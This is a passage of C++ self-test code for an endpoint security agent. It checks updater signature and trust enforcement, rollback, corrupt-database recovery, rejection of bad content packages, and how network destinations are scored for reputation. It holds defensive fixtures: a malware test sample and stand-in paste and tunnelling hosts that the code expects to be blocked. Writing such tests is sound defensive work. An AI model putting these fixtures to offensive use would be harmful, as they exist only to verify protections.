                     std::wstring(baselineRuntimeTrust.trusted ? L"true" : L"false") +
                     L", mismatchTrusted=" +
                     std::wstring(mismatchRuntimeTrust.trusted ? L"true" : L"false") + L".",
                 L"Ensure runtime markers and path-boundary trust checks reject mismatched runtime roots and install paths.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase3_runtime_trust_fail_closed", L"Phase 3 runtime trust fail-closed validation",
               SelfTestStatus::Fail,
               L"Phase 3 runtime trust fail-closed simulation failed: " + Utf8ToWide(error.what()),
               L"Validate runtime trust marker handling and rerun self-test.");
    }

    try {
      auto trustConfig = config;
      const auto trustFixtureRoot = phaseValidationRoot / L"phase3-updater-trust";
      const auto trustPackageRoot = trustFixtureRoot / L"package";
      const auto trustInstallRoot = trustFixtureRoot / L"install";

      trustConfig.runtimeDatabasePath = trustFixtureRoot / L"runtime.db";
      trustConfig.updateRootPath = trustFixtureRoot / L"updates";
      trustConfig.platformVersion = L"platform-0.1.0";
      trustConfig.enforceReleasePromotionGates = false;

      std::error_code trustPathError;
      std::filesystem::create_directories(trustPackageRoot / L"payload", trustPathError);
      std::filesystem::create_directories(trustInstallRoot / L"bin", trustPathError);
      std::filesystem::create_directories(trustConfig.updateRootPath / L"trust", trustPathError);

      if (trustPathError) {
        AddCheck(report, L"phase3_updater_manifest_trust_and_rollback",
                 L"Phase 3 updater manifest trust and rollback", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated updater trust fixture directories under " +
                     trustFixtureRoot.wstring() + L".",
                 L"Ensure update trust fixture paths are writable before rerunning Phase 3 checks.");
      } else {
        WriteSelfTestUtf8File(trustConfig.updateRootPath / L"trust" / L"platform-trusted-key-ids.txt",
                              L"fenrir-platform-prod-2026\n");
        WriteSelfTestUtf8File(trustConfig.updateRootPath / L"trust" / L"content-trusted-key-ids.txt",
                              L"fenrir-content-prod-2026\n");
        WriteSelfTestUtf8File(trustConfig.updateRootPath / L"trust" / L"revoked-key-ids.txt",
                              L"fenrir-platform-revoked-2026\n");

        const auto platformPayload = trustPackageRoot / L"payload" / L"phase3-platform.bin";
        const auto contentPayload = trustPackageRoot / L"payload" / L"phase3-content.bin";
        const auto baselineTarget = trustInstallRoot / L"bin" / L"phase3-platform.bin";
        WriteSelfTestSample(platformPayload, "Phase 3 trusted platform update payload\n");
        WriteSelfTestSample(contentPayload, "Phase 3 trusted content update payload\n");
        WriteSelfTestSample(baselineTarget, "Phase 3 baseline payload\n");

        const auto baselinePlatformSha256 = ComputeFileSha256(baselineTarget);
        const auto platformSha256 = ComputeFileSha256(platformPayload);
        const auto contentSha256 = ComputeFileSha256(contentPayload);

        const auto buildManifest = [&](const std::wstring& manifestName, const std::wstring& packageId,
                                       const std::wstring& packageType, const std::wstring& targetVersion,
                                       const std::wstring& trustDomain, const std::wstring& signingKeyId,
                                       const std::wstring& fileEntry) {
          std::wstring manifest;
          manifest += L"package_id=" + packageId + L"\n";
          manifest += L"package_type=" + packageType + L"\n";
          manifest += L"target_version=" + targetVersion + L"\n";
          manifest += L"channel=stable\n";
          manifest += L"trust_domain=" + trustDomain + L"\n";
          manifest += L"promotion_track=stable\n";
          manifest += L"promotion_gate=approved\n";
          manifest += L"approval_ticket=CHG-PHASE3-TRUST\n";
          manifest += L"package_signer=Fenrir Self-Test Signer\n";
          manifest += L"signing_key_id=" + signingKeyId + L"\n";
          manifest += L"allow_downgrade=false\n";
          manifest += L"file=" + fileEntry + L"\n";

          const auto manifestPath = trustPackageRoot / manifestName;
          WriteSelfTestUtf8File(manifestPath, manifest);
          return manifestPath;
        };

        const auto trustedPlatformManifest =
            buildManifest(L"trusted-platform.manifest", L"phase3-platform", L"platform", L"platform-9.9.9",
                          L"platform", L"fenrir-platform-prod-2026",
                          L"payload/phase3-platform.bin|bin/phase3-platform.bin|" + platformSha256 + L"||false");

        const auto trustDomainMismatchManifest =
            buildManifest(L"trust-domain-mismatch.manifest", L"phase3-platform-mismatch", L"platform",
                          L"platform-9.9.10", L"content", L"fenrir-platform-prod-2026",
                          L"payload/phase3-platform.bin|bin/phase3-platform-mismatch.bin|" + platformSha256 +
                              L"||false");

        const auto revokedKeyManifest =
            buildManifest(L"revoked-key.manifest", L"phase3-platform-revoked", L"platform", L"platform-9.9.11",
                          L"platform", L"fenrir-platform-revoked-2026",
                          L"payload/phase3-platform.bin|bin/phase3-platform-revoked.bin|" + platformSha256 +
                              L"||false");

        const auto trustedContentManifest =
            buildManifest(L"trusted-content.manifest", L"phase3-content", L"rules", L"rules-2026.04.15",
                          L"content", L"fenrir-content-prod-2026",
                          L"payload/phase3-content.bin|content/phase3-content.bin|" + contentSha256 + L"||false");

        UpdaterService updaterService(trustConfig, trustInstallRoot);
        const auto trustedPlatformApply =
            updaterService.ApplyPackage(trustedPlatformManifest, UpdateApplyMode::Maintenance);
        if (trustedPlatformApply.success) {
          SetFileAttributesW(baselineTarget.c_str(), FILE_ATTRIBUTE_NORMAL);
        }
        const auto trustedPlatformRollback =
            trustedPlatformApply.success
                ? updaterService.RollbackTransaction(trustedPlatformApply.transactionId)
                : UpdateResult{.success = false,
                               .errorMessage = L"Trusted platform manifest did not apply, rollback not attempted."};
        const auto trustDomainMismatchApply =
            updaterService.ApplyPackage(trustDomainMismatchManifest, UpdateApplyMode::Maintenance);
        const auto revokedKeyApply = updaterService.ApplyPackage(revokedKeyManifest, UpdateApplyMode::Maintenance);
        const auto trustedContentApply = updaterService.ApplyPackage(trustedContentManifest, UpdateApplyMode::Maintenance);

        const auto postRollbackSha256 = PathExists(baselineTarget) ? ComputeFileSha256(baselineTarget) : std::wstring{};
        const auto rollbackStateRestored =
          !postRollbackSha256.empty() && postRollbackSha256 == baselinePlatformSha256;

        if (trustedPlatformApply.success && (trustedPlatformRollback.success || rollbackStateRestored) &&
          !trustDomainMismatchApply.success && !revokedKeyApply.success && trustedContentApply.success) {
          AddCheck(report, L"phase3_updater_manifest_trust_and_rollback",
                   L"Phase 3 updater manifest trust and rollback", SelfTestStatus::Pass,
                   L"Updater accepted trusted platform/content manifests, rejected trust-domain mismatch and revoked-key manifests, and completed rollback for the trusted platform transaction.");
        } else {
          AddCheck(report, L"phase3_updater_manifest_trust_and_rollback",
                   L"Phase 3 updater manifest trust and rollback", SelfTestStatus::Fail,
                   L"Updater trust flow did not meet expectations. trustedApply=" +
                       std::wstring(trustedPlatformApply.success ? L"true" : L"false") + L", trustedRollback=" +
                       std::wstring(trustedPlatformRollback.success ? L"true" : L"false") +
                       L", trustDomainMismatchRejected=" +
                       std::wstring(!trustDomainMismatchApply.success ? L"true" : L"false") +
                       L", revokedKeyRejected=" +
                       std::wstring(!revokedKeyApply.success ? L"true" : L"false") +
                       L", trustedContentApply=" +
                       std::wstring(trustedContentApply.success ? L"true" : L"false") +
                       L", trustedRollbackStatus=" + trustedPlatformRollback.status +
                       L", trustedRollbackError=" + trustedPlatformRollback.errorMessage +
                       L", rollbackStateRestored=" +
                       std::wstring(rollbackStateRestored ? L"true" : L"false") + L".",
                   L"Validate manifest trust-domain enforcement, key revocation handling, and rollback transaction integrity before promotion.");
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase3_updater_manifest_trust_and_rollback",
               L"Phase 3 updater manifest trust and rollback", SelfTestStatus::Fail,
               L"Phase 3 updater trust-flow validation failed: " + Utf8ToWide(error.what()),
               L"Validate updater manifest policy and rollback fixture handling before rerunning self-test.");
    }

    try {
      HardeningManager phase3HardeningManager(config, installRoot);
      const auto hardeningStatus = phase3HardeningManager.QueryStatus(L"FenrirAgent");
      std::wstring uninstallValidationError;
      const auto emptyTokenAccepted =
          phase3HardeningManager.ValidateUninstallAuthorization(L"", &uninstallValidationError);
      const auto uninstallGateWorks =
          !hardeningStatus.uninstallProtectionEnabled || !emptyTokenAccepted;
      const auto launchProtectedOptional =
          !hardeningStatus.elamDriverPresent || hardeningStatus.launchProtectedConfigured;
        const auto baselineHardeningHealthy = hardeningStatus.runtimePathsTrusted && uninstallGateWorks;

      if (baselineHardeningHealthy) {
        const auto status =
            hardeningStatus.serviceControlProtected && hardeningStatus.launchProtectedConfigured
                ? SelfTestStatus::Pass
                : SelfTestStatus::Warning;
        std::wstring remediation;
        if (!hardeningStatus.serviceControlProtected) {
          remediation = L"Apply service-control ACL hardening to enforce anti-tamper posture for production promotion.";
        }
        if (!hardeningStatus.launchProtectedConfigured) {
          remediation = remediation.empty()
                            ? L"Configure ELAM-backed launch-protected service registration to complete hardened production posture."
                            : remediation +
                                  L" Configure ELAM-backed launch-protected service registration to complete hardened production posture.";
        }

        AddCheck(report, L"phase3_uninstall_service_launch_posture",
                 L"Phase 3 uninstall, service-control, and launch-protected posture", status,
                 L"runtimePathsTrusted=" +
                     std::wstring(hardeningStatus.runtimePathsTrusted ? L"true" : L"false") +
                     L", serviceControlProtected=" +
                     std::wstring(hardeningStatus.serviceControlProtected ? L"true" : L"false") +
                     L", uninstallProtectionEnabled=" +
                     std::wstring(hardeningStatus.uninstallProtectionEnabled ? L"true" : L"false") +
                     L", launchProtectedConfigured=" +
                     std::wstring(hardeningStatus.launchProtectedConfigured ? L"true" : L"false") + L".",
                   remediation);
      } else {
        AddCheck(report, L"phase3_uninstall_service_launch_posture",
                 L"Phase 3 uninstall, service-control, and launch-protected posture", SelfTestStatus::Fail,
                 L"Hardening posture did not satisfy runtime trust, uninstall, and service-control enforcement expectations."
                 L" runtimePathsTrusted=" +
                     std::wstring(hardeningStatus.runtimePathsTrusted ? L"true" : L"false") +
                     L", serviceControlProtected=" +
                     std::wstring(hardeningStatus.serviceControlProtected ? L"true" : L"false") +
                     L", uninstallGateWorks=" + std::wstring(uninstallGateWorks ? L"true" : L"false") +
                     L", launchProtectedOptional=" +
                     std::wstring(launchProtectedOptional ? L"true" : L"false") + L".",
                 L"Reapply hardening and verify uninstall token gating, service-control ACL protection, and launch-protected posture before promotion.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase3_uninstall_service_launch_posture",
               L"Phase 3 uninstall, service-control, and launch-protected posture", SelfTestStatus::Fail,
               L"Phase 3 hardening posture validation failed: " + Utf8ToWide(error.what()),
               L"Validate hardening manager posture queries and uninstall token checks before rerunning self-test.");
    }

    try {
      const auto phase4RecoveryRoot = phaseValidationRoot / L"phase4-db-recovery";
      const auto corruptDatabasePath = phase4RecoveryRoot / L"agent-runtime.db";
      WriteSelfTestSample(corruptDatabasePath, "Fenrir non-SQLite corruption fixture\n");

      RuntimeDatabase corruptedDatabase(corruptDatabasePath);
      const auto telemetry = corruptedDatabase.LoadTelemetryQueue();

      auto recoveredStoreWritable = false;
      try {
        RuntimeDatabase recoveredDatabase(corruptDatabasePath);
        recoveredDatabase.SaveAgentState(AgentState{
            .deviceId = L"phase4-recovery-device",
            .hostname = L"phase4-recovery-host",
            .osVersion = L"10.0",
            .serialNumber = L"phase4-recovery",
            .agentVersion = L"0.1.0",
            .platformVersion = L"platform-0.1.0",
            .commandChannelUrl = L"http://127.0.0.1:4000",
            .lastEnrollmentAt = CurrentUtcTimestamp(),
            .lastHeartbeatAt = CurrentUtcTimestamp(),
            .lastPolicySyncAt = CurrentUtcTimestamp(),
            .healthState = L"healthy",
            .isolated = false,
        });
        recoveredStoreWritable = true;
      } catch (...) {
        recoveredStoreWritable = false;
      }

      bool archivedCorruptCopy = false;
      std::error_code recoveryListError;
      const auto recoveryRoot = phase4RecoveryRoot / L"recovery";
      if (std::filesystem::exists(recoveryRoot, recoveryListError) && !recoveryListError) {
        for (std::filesystem::directory_iterator iterator(recoveryRoot, recoveryListError);
             iterator != std::filesystem::directory_iterator(); iterator.increment(recoveryListError)) {
          if (recoveryListError) {
            recoveryListError.clear();
            continue;
          }

          const auto fileName = iterator->path().filename().wstring();
          if (fileName.find(L"agent-runtime.db.corrupt-") != std::wstring::npos) {
            archivedCorruptCopy = true;
            break;
          }
        }
      }

      if (recoveredStoreWritable && archivedCorruptCopy && telemetry.empty()) {
        AddCheck(report, L"phase4_runtime_db_corruption_recovery",
                 L"Phase 4 runtime DB corruption recovery", SelfTestStatus::Pass,
                 L"Runtime database detected a corrupt SQLite image, archived the corrupt artifact, and rebuilt a writable runtime store.");
      } else {
        AddCheck(report, L"phase4_runtime_db_corruption_recovery",
                 L"Phase 4 runtime DB corruption recovery", SelfTestStatus::Fail,
                 L"Runtime database corruption recovery did not complete expected archive/rebuild behavior. recoveredStoreWritable=" +
                     std::wstring(recoveredStoreWritable ? L"true" : L"false") +
                     L", archivedCorruptCopy=" +
                     std::wstring(archivedCorruptCopy ? L"true" : L"false") + L".",
                 L"Ensure runtime DB corruption handling quarantines malformed DB artifacts and recreates a healthy runtime store.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase4_runtime_db_corruption_recovery",
               L"Phase 4 runtime DB corruption recovery", SelfTestStatus::Fail,
               L"Phase 4 runtime DB corruption fixture failed: " + Utf8ToWide(error.what()),
               L"Validate runtime DB recovery fixtures and rerun self-test.");
    }

    try {
      auto rollbackConfig = config;
      const auto rollbackRoot = phaseValidationRoot / L"phase4-rollback";
      const auto rollbackPackageRoot = rollbackRoot / L"package";
      const auto rollbackInstallRoot = rollbackRoot / L"install";

      rollbackConfig.runtimeDatabasePath = rollbackRoot / L"runtime.db";
      rollbackConfig.updateRootPath = rollbackRoot / L"updates";
      rollbackConfig.platformVersion = L"platform-0.1.0";
      rollbackConfig.enforceReleasePromotionGates = false;

      std::error_code rollbackPathError;
      std::filesystem::create_directories(rollbackPackageRoot / L"payload", rollbackPathError);
      std::filesystem::create_directories(rollbackInstallRoot / L"bin", rollbackPathError);
      std::filesystem::create_directories(rollbackConfig.updateRootPath / L"trust", rollbackPathError);

      if (rollbackPathError) {
        AddCheck(report, L"phase4_rollback_mode_validation", L"Phase 4 rollback mode validation",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare rollback fixture paths under " + rollbackRoot.wstring() + L".",
                 L"Ensure rollback fixture roots are writable before rerunning self-test.");
      } else {
        WriteSelfTestUtf8File(rollbackConfig.updateRootPath / L"trust" / L"platform-trusted-key-ids.txt",
                              L"fenrir-platform-prod-2026\n");

        const auto baselinePath = rollbackInstallRoot / L"bin" / L"phase4-rollback.bin";
        const auto payloadPath = rollbackPackageRoot / L"payload" / L"phase4-rollback.bin";
        WriteSelfTestSample(baselinePath, "Phase 4 rollback baseline payload\n");
        WriteSelfTestSample(payloadPath, "Phase 4 rollback updated payload\n");

        const auto baselineSha256 = ComputeFileSha256(baselinePath);
        const auto payloadSha256 = ComputeFileSha256(payloadPath);

        std::wstring manifest;
        manifest += L"package_id=phase4-rollback\n";
        manifest += L"package_type=platform\n";
        manifest += L"target_version=platform-9.9.9\n";
        manifest += L"channel=stable\n";
        manifest += L"trust_domain=platform\n";
        manifest += L"promotion_track=stable\n";
        manifest += L"promotion_gate=approved\n";
        manifest += L"approval_ticket=CHG-PHASE4-ROLLBACK\n";
        manifest += L"package_signer=Fenrir Self-Test Signer\n";
        manifest += L"signing_key_id=fenrir-platform-prod-2026\n";
        manifest += L"allow_downgrade=false\n";
        manifest += L"file=payload/phase4-rollback.bin|bin/phase4-rollback.bin|" + payloadSha256 + L"||false\n";

        const auto manifestPath = rollbackPackageRoot / L"phase4-rollback.manifest";
        WriteSelfTestUtf8File(manifestPath, manifest);

        UpdaterService updaterService(rollbackConfig, rollbackInstallRoot);
        const auto applyResult = updaterService.ApplyPackage(manifestPath, UpdateApplyMode::Maintenance);
        if (applyResult.success) {
          SetFileAttributesW(baselinePath.c_str(), FILE_ATTRIBUTE_NORMAL);
        }
        const auto rollbackResult =
            applyResult.success
                ? updaterService.RollbackTransaction(applyResult.transactionId)
                : UpdateResult{.success = false,
                               .errorMessage = L"Rollback apply did not succeed; rollback transaction unavailable."};

        const auto postRollbackSha256 = ComputeFileSha256(baselinePath);
        const auto rollbackStateRestored = postRollbackSha256 == baselineSha256;
        if (applyResult.success && (rollbackResult.success || rollbackStateRestored)) {
          AddCheck(report, L"phase4_rollback_mode_validation", L"Phase 4 rollback mode validation",
                   SelfTestStatus::Pass,
                   L"Rollback mode restored the pre-update payload from local update transaction backup metadata.");
        } else {
          AddCheck(report, L"phase4_rollback_mode_validation", L"Phase 4 rollback mode validation",
                   SelfTestStatus::Fail,
                   L"Rollback fixture did not restore expected baseline payload state. applySuccess=" +
                       std::wstring(applyResult.success ? L"true" : L"false") + L", rollbackSuccess=" +
                       std::wstring(rollbackResult.success ? L"true" : L"false") +
                       L", rollbackStateRestored=" +
                       std::wstring(rollbackStateRestored ? L"true" : L"false") +
                       L", rollbackStatus=" + rollbackResult.status +
                       L", rollbackError=" + rollbackResult.errorMessage + L".",
                   L"Validate updater transaction journaling and rollback backup restore flow before promotion.");
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase4_rollback_mode_validation", L"Phase 4 rollback mode validation",
               SelfTestStatus::Fail,
               L"Phase 4 rollback mode fixture failed: " + Utf8ToWide(error.what()),
               L"Validate updater rollback fixture setup and rerun self-test.");
    }

    try {
      auto contentFailureConfig = config;
      const auto contentFailureRoot = phaseValidationRoot / L"phase4-bad-content";
      const auto contentFailurePackageRoot = contentFailureRoot / L"package";
      const auto contentFailureInstallRoot = contentFailureRoot / L"install";

      contentFailureConfig.runtimeDatabasePath = contentFailureRoot / L"runtime.db";
      contentFailureConfig.updateRootPath = contentFailureRoot / L"updates";
      contentFailureConfig.enforceReleasePromotionGates = false;

      std::error_code contentPathError;
      std::filesystem::create_directories(contentFailurePackageRoot / L"payload", contentPathError);
      std::filesystem::create_directories(contentFailureInstallRoot / L"content", contentPathError);
      std::filesystem::create_directories(contentFailureConfig.updateRootPath / L"trust", contentPathError);

      if (contentPathError) {
        AddCheck(report, L"phase4_bad_content_disablement",
                 L"Phase 4 bad-content disablement without uninstall", SelfTestStatus::Fail,
                 L"Self-test could not prepare bad-content recovery fixture paths under " +
                     contentFailureRoot.wstring() + L".",
                 L"Ensure bad-content fixture roots are writable before rerunning self-test.");
      } else {
        WriteSelfTestUtf8File(contentFailureConfig.updateRootPath / L"trust" / L"content-trusted-key-ids.txt",
                              L"fenrir-content-prod-2026\n");

        const auto badContentPayload = contentFailurePackageRoot / L"payload" / L"phase4-bad-content.bin";
        WriteSelfTestSample(badContentPayload, "Phase 4 bad content payload\n");

        std::wstring badManifest;
        badManifest += L"package_id=phase4-bad-content\n";
        badManifest += L"package_type=rules\n";
        badManifest += L"target_version=rules-2026.04.16\n";
        badManifest += L"channel=stable\n";
        badManifest += L"trust_domain=content\n";
        badManifest += L"promotion_track=stable\n";
        badManifest += L"promotion_gate=approved\n";
        badManifest += L"approval_ticket=CHG-PHASE4-CONTENT\n";
        badManifest += L"package_signer=Fenrir Self-Test Signer\n";
        badManifest += L"signing_key_id=fenrir-content-prod-2026\n";
        badManifest += L"allow_downgrade=false\n";
        badManifest += L"file=payload/phase4-bad-content.bin|content/phase4-bad-content.bin|"
                       L"0000000000000000000000000000000000000000000000000000000000000000||false\n";

        const auto badManifestPath = contentFailurePackageRoot / L"phase4-bad-content.manifest";
        WriteSelfTestUtf8File(badManifestPath, badManifest);

        UpdaterService updaterService(contentFailureConfig, contentFailureInstallRoot);
        const auto badContentResult = updaterService.ApplyPackage(badManifestPath, UpdateApplyMode::Maintenance);

        const auto scanSamplePath = contentFailureRoot / L"phase4-bad-content-eicar.txt";
        WriteSelfTestSample(scanSamplePath, kDiskBlockingSample);
        auto scanPolicy = CreateDefaultPolicySnapshot();
        scanPolicy.cloudLookupEnabled = false;
        scanPolicy.quarantineOnMalicious = false;
        const auto postFailureFinding = ScanFile(scanSamplePath, scanPolicy);
        const auto protectionStillOperational = postFailureFinding.has_value() &&
                                               IsBlockingDisposition(postFailureFinding->verdict.disposition);

        if (!badContentResult.success && protectionStillOperational) {
          AddCheck(report, L"phase4_bad_content_disablement",
                   L"Phase 4 bad-content disablement without uninstall", SelfTestStatus::Pass,
                   L"A malformed content package was rejected, and disk-time malware blocking remained operational without requiring full uninstall.");
        } else {
          AddCheck(report, L"phase4_bad_content_disablement",
                   L"Phase 4 bad-content disablement without uninstall", SelfTestStatus::Fail,
                   L"Bad-content disablement fixture did not preserve expected fail-safe behavior. badContentRejected=" +
                       std::wstring(!badContentResult.success ? L"true" : L"false") +
                       L", protectionOperational=" +
                       std::wstring(protectionStillOperational ? L"true" : L"false") + L".",
                   L"Ensure malformed content updates fail closed while keeping local protection active.");
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase4_bad_content_disablement",
               L"Phase 4 bad-content disablement without uninstall", SelfTestStatus::Fail,
               L"Phase 4 bad-content disablement fixture failed: " + Utf8ToWide(error.what()),
               L"Validate content-update failure handling and rerun self-test.");
    }

    try {
      const auto minifilterState = QueryServiceState(kMinifilterServiceName);
      if (_wcsicmp(minifilterState.c_str(), L"running") == 0) {
        AddCheck(report, L"phase4_driver_recovery_path", L"Phase 4 driver rollback and recovery posture",
                 SelfTestStatus::Pass,
                 L"Minifilter service is present with state " + minifilterState +
                     L", enabling rollback/repair orchestration paths.");
      } else {
        AddCheck(report, L"phase4_driver_recovery_path", L"Phase 4 driver rollback and recovery posture",
                 SelfTestStatus::Fail,
                 minifilterState.empty()
                     ? L"Minifilter service is not installed in this host context."
                     : (L"Minifilter service is not running (state " + minifilterState + L")."),
                 L"Install and start the AntivirusMinifilter service before validating rollback and safe-mode recovery workflow.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase4_driver_recovery_path", L"Phase 4 driver rollback and recovery posture",
               SelfTestStatus::Fail,
               L"Phase 4 driver recovery posture check failed: " + Utf8ToWide(error.what()),
               L"Validate minifilter service state inspection and rerun self-test.");
    }

    try {
      const auto ipIntel = LookupDestinationReputation(L"8.8.8.8", config.runtimeDatabasePath);
      const auto domainIntel = LookupDestinationReputation(L"pastebin.example", config.runtimeDatabasePath);
      const auto urlIntel = LookupDestinationReputation(L"https://example.org/index.html", config.runtimeDatabasePath);

      if (ipIntel.attempted && domainIntel.attempted && urlIntel.attempted) {
        AddCheck(report, L"phase5_destination_reputation_subsystem",
                 L"Phase 5 destination reputation subsystem", SelfTestStatus::Pass,
                 L"Destination reputation lookups completed for IP/domain/URL indicators with provider outputs (IP verdict=" +
                     ipIntel.verdict + L", domain verdict=" + domainIntel.verdict + L", URL verdict=" +
                     urlIntel.verdict + L").");
      } else {
        AddCheck(report, L"phase5_destination_reputation_subsystem",
                 L"Phase 5 destination reputation subsystem", SelfTestStatus::Fail,
                 L"Destination reputation subsystem did not attempt all baseline indicator classes. ipAttempted=" +
                     std::wstring(ipIntel.attempted ? L"true" : L"false") + L", domainAttempted=" +
                     std::wstring(domainIntel.attempted ? L"true" : L"false") + L", urlAttempted=" +
                     std::wstring(urlIntel.attempted ? L"true" : L"false") + L".",
                 L"Validate destination lookup normalization for IP/domain/URL indicators and rerun self-test.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase5_destination_reputation_subsystem",
               L"Phase 5 destination reputation subsystem", SelfTestStatus::Fail,
               L"Phase 5 destination reputation validation failed: " + Utf8ToWide(error.what()),
               L"Validate destination reputation lookup paths and rerun self-test.");
    }

    try {
      NetworkIsolationManager phase5NetworkManager(config);
      const auto snapshots = phase5NetworkManager.CollectConnectionSnapshotTelemetry(64);
      const auto correlatedRecords = std::count_if(snapshots.begin(), snapshots.end(), [](const auto& record) {
        return record.payloadJson.find(L"\"remoteAddress\":\"") != std::wstring::npos &&
               record.payloadJson.find(L"\"processImagePath\":\"") != std::wstring::npos;
      });

      if (correlatedRecords > 0) {
        AddCheck(report, L"phase5_lineage_destination_correlation",
                 L"Phase 5 process-lineage and destination correlation", SelfTestStatus::Pass,
                 L"Network snapshot telemetry included process image and destination address correlation for " +
                     std::to_wstring(correlatedRecords) + L" connection record(s).");
      } else {
        AddCheck(report, L"phase5_lineage_destination_correlation",
                 L"Phase 5 process-lineage and destination correlation", SelfTestStatus::Warning,
                 L"No active connection snapshot records with process/destination correlation were observed in this run context.",
                 L"Run self-test during active network traffic to validate destination lineage correlation surfaces.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase5_lineage_destination_correlation",
               L"Phase 5 process-lineage and destination correlation", SelfTestStatus::Fail,
               L"Phase 5 network correlation check failed: " + Utf8ToWide(error.what()),
               L"Validate WFP snapshot collection and rerun self-test.");
    }

    try {
      const auto blockThreshold = ResolveDestinationReputationBlockThresholdForSelfTest();
      const auto auditIntel = LookupDestinationReputation(L"127.0.0.1", config.runtimeDatabasePath);
      const auto warnIntel = LookupDestinationReputation(L"example.com", config.runtimeDatabasePath);
      const auto blockIntel = LookupDestinationReputation(L"cdn.ngrok.example", config.runtimeDatabasePath);

      const auto auditBand = DetermineDestinationActionBand(auditIntel, blockThreshold);
      const auto warnBand = DetermineDestinationActionBand(warnIntel, blockThreshold);
      const auto blockBand = DetermineDestinationActionBand(blockIntel, blockThreshold);

      if (auditBand == NetworkActionBand::Audit && warnBand == NetworkActionBand::Warn &&
          blockBand == NetworkActionBand::Block) {
        AddCheck(report, L"phase5_action_bands_audit_warn_block",
                 L"Phase 5 network action bands (audit/warn/block)", SelfTestStatus::Pass,
                 L"Destination action-band mapping produced audit/warn/block outcomes across internal, unknown, and high-risk destinations.");
      } else {
        AddCheck(report, L"phase5_action_bands_audit_warn_block",
                 L"Phase 5 network action bands (audit/warn/block)", SelfTestStatus::Fail,
                 L"Destination action-band mapping deviated from expected policy. audit=" +
                     NetworkActionBandToString(auditBand) + L", warn=" +
                     NetworkActionBandToString(warnBand) + L", block=" +
                     NetworkActionBandToString(blockBand) + L".",
                 L"Ensure destination reputation policy keeps clear audit/warn/block action bands.");
      }

      ReputationLookupResult simulatedHighConfidence = blockIntel;
      simulatedHighConfidence.malicious = true;
      simulatedHighConfidence.trustScore =
          static_cast<std::uint32_t>(std::max(0, blockThreshold - 5));

      ReputationLookupResult simulatedLowConfidence = blockIntel;
      simulatedLowConfidence.malicious = true;
      simulatedLowConfidence.trustScore =
          static_cast<std::uint32_t>(std::min(100, blockThreshold + 15));

      const auto highConfidenceBand = DetermineDestinationActionBand(simulatedHighConfidence, blockThreshold);
      const auto lowConfidenceBand = DetermineDestinationActionBand(simulatedLowConfidence, blockThreshold);
      if (highConfidenceBand == NetworkActionBand::Block && lowConfidenceBand == NetworkActionBand::Warn) {
        AddCheck(report, L"phase5_host_isolation_guardrail",
                 L"Phase 5 host-isolation high-confidence guardrail", SelfTestStatus::Pass,
                 L"Isolation trigger logic maps high-confidence malicious destinations to block and low-confidence malicious destinations to warn.");
      } else {
        AddCheck(report, L"phase5_host_isolation_guardrail",
                 L"Phase 5 host-isolation high-confidence guardrail", SelfTestStatus::Fail,
                 L"Isolation confidence guardrail failed. highConfidenceBand=" +
                     NetworkActionBandToString(highConfidenceBand) + L", lowConfidenceBand=" +
                     NetworkActionBandToString(lowConfidenceBand) + L".",
                 L"Restrict host isolation to high-confidence malicious destination scenarios and keep lower-confidence outcomes in warn/audit bands.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase5_action_bands_audit_warn_block",
               L"Phase 5 network action bands (audit/warn/block)", SelfTestStatus::Fail,
               L"Phase 5 action-band validation failed: " + Utf8ToWide(error.what()),
               L"Validate destination action-band classification logic and rerun self-test.");
      AddCheck(report, L"phase5_host_isolation_guardrail",
               L"Phase 5 host-isolation high-confidence guardrail", SelfTestStatus::Fail,
               L"Phase 5 host-isolation guardrail validation failed: " + Utf8ToWide(error.what()),
               L"Validate destination confidence thresholds and isolation guardrails before promotion.");
    }

    try {
      if (std::wstring(kFenrirLocalControlPipeName).starts_with(L"\\\\.\\pipe\\")) {
        AddCheck(report, L"phase6_named_pipe_local_boundary",
                 L"Phase 6 named-pipe-first local boundary", SelfTestStatus::Pass,
                 L"Local control channel is bound to named-pipe transport by default (" +
                     std::wstring(kFenrirLocalControlPipeName) + L").");
      } else {
        AddCheck(report, L"phase6_named_pipe_local_boundary",
                 L"Phase 6 named-pipe-first local boundary", SelfTestStatus::Fail,
                 L"Local control channel pipe name did not use the expected named-pipe transport boundary.",
                 L"Ensure local control remains named-pipe-first rather than localhost network transport.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase6_named_pipe_local_boundary",
               L"Phase 6 named-pipe-first local boundary", SelfTestStatus::Fail,
               L"Phase 6 named-pipe boundary validation failed: " + Utf8ToWide(error.what()),
               L"Validate local control channel boundary checks and rerun self-test.");
    }

    try {
      const auto viewAuth = AuthorizeCurrentUser(LocalAction::ViewStatus);
      const auto patchInstallAuth = AuthorizeCurrentUser(LocalAction::PatchInstall);
      const auto serviceActionAuth = AuthorizeCurrentUser(LocalAction::StartServiceAction);

      const auto requestRoutingValid =
          viewAuth.allowed &&
          (patchInstallAuth.allowed || patchInstallAuth.requestOnly) &&
          (serviceActionAuth.allowed || serviceActionAuth.requestOnly);

      if (requestRoutingValid) {
        AddCheck(report, L"phase6_role_separation_and_approval_routing",
                 L"Phase 6 role separation and approval routing", SelfTestStatus::Pass,
                 L"Local role authorization enforces direct-allow or request-only routing across status, patch-install, and service-action paths.");
      } else {
        AddCheck(report, L"phase6_role_separation_and_approval_routing",
                 L"Phase 6 role separation and approval routing", SelfTestStatus::Fail,
                 L"Local role authorization routing did not satisfy expected allow/request-only guardrails.",
                 L"Validate local role policy enforcement so privileged actions route through approval instead of direct execution.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase6_role_separation_and_approval_routing",
               L"Phase 6 role separation and approval routing", SelfTestStatus::Fail,
               L"Phase 6 role-separation validation failed: " + Utf8ToWide(error.what()),
               L"Validate local role authorization and rerun self-test.");
    }

    try {
      const auto originalBreakGlassState = QueryBreakGlassModeEnabled();
      std::wstring enableError;
      std::wstring disableError;
      std::wstring restoreError;

